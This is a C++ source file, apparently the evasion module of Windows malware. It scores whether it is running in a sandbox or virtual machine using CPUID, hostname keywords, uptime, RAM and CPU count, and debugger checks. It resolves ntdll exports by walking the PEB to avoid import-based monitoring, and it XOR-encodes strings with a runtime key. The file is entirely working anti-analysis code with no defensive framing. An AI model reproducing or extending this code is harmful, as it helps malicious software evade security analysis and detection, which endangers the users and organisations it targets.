#include "evade.h"

#include <windows.h>
#include <intrin.h>
#include <tlhelp32.h>

#include <chrono>
#include <random>
#include <thread>

namespace evade {

static bool CpuVendorIsVm() {
    int regs[4] = {0};
    __cpuid(regs, 0x40000000);
    return regs[1] == 0x4D566572 && regs[2] == 0x65726177;
}

static bool HostnameLooksVm() {
    wchar_t buf[256] = {0};
    DWORD sz = 256;
    GetComputerNameW(buf, &sz);
    std::wstring h(buf);
    for (auto& c : h) c = (wchar_t)towlower(c);
    const wchar_t* bad[] = { L"sandbox", L"malware", L"virus", L"cuckoo", L"analysis", L"vmware", L"vbox" };
    for (auto* b : bad) if (h.find(b) != std::wstring::npos) return true;
    return false;
}

static bool LowUptime() {
    ULONGLONG ms = GetTickCount64();
    return ms < 10ULL * 60 * 1000;
}

static bool LowRamOrCpu() {
    MEMORYSTATUSEX m{ sizeof(m) };
    GlobalMemoryStatusEx(&m);
    unsigned cores = std::thread::hardware_concurrency();
    return (m.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) || (cores < 2);
}

static bool DebuggerAttached() {
    return IsDebuggerPresent() != 0;
}

bool LooksLikeSandbox() {
    int score = 0;
    if (CpuVendorIsVm())        score += 2;
    if (HostnameLooksVm())      score += 2;
    if (LowUptime())            score += 1;
    if (LowRamOrCpu())          score += 1;
    if (DebuggerAttached())     score += 2;
    return score >= 3;
}

void* ResolveNtdll(const char* func) {
#ifdef _WIN64
    BYTE* peb = (BYTE*)__readgsqword(0x60);
#else
    BYTE* peb = (BYTE*)__readfsdword(0x30);
#endif
    BYTE* ldr = *(BYTE**)(peb + 0x18);
    LIST_ENTRY* head = (LIST_ENTRY*)(ldr + 0x10);
    for (LIST_ENTRY* e = head->Flink; e != head; e = e->Flink) {
        BYTE* mod = (BYTE*)e - 0x10;
        UNICODE_STRING* name = (UNICODE_STRING*)(mod + 0x58);
        if (name->Length == 16) {
            wchar_t buf[9] = {0};
            memcpy(buf, name->Buffer, 16);
            if (_wcsicmp(buf, L"ntdll.dll") == 0) {
                BYTE* base = *(BYTE**)(mod + 0x30);
                IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
                IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
                IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)
                    (base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                DWORD* names = (DWORD*)(base + exp->AddressOfNames);
                WORD* ords = (WORD*)(base + exp->AddressOfNameOrdinals);
                DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);
                for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
                    const char* n = (const char*)(base + names[i]);
                    if (strcmp(n, func) == 0)
                        return base + funcs[ords[i]];
                }
                return nullptr;
            }
        }
    }
    return nullptr;
}

static uint8_t KeyByte() {
    static uint8_t k = 0;
    if (!k) {
        LARGE_INTEGER c; QueryPerformanceCounter(&c);
        k = uint8_t((c.QuadPart ^ GetTickCount64()) & 0xFF) | 1;
    }
    return k;
}

std::vector<uint8_t> EncodeRuntime(const std::string& plain) {
    uint8_t k = KeyByte();
    std::vector<uint8_t> out;
    out.reserve(plain.size() + 1);
    out.push_back(k);
    for (char c : plain) out.push_back(uint8_t(c) ^ k);
    return out;
}

std::string Decode(const std::vector<uint8_t>& enc) {
    if (enc.empty()) return {};
    uint8_t k = enc[0];
    std::string out;
    out.reserve(enc.size() - 1);
    for (size_t i = 1; i < enc.size(); ++i) out.push_back(char(enc[i] ^ k));
    return out;
}

}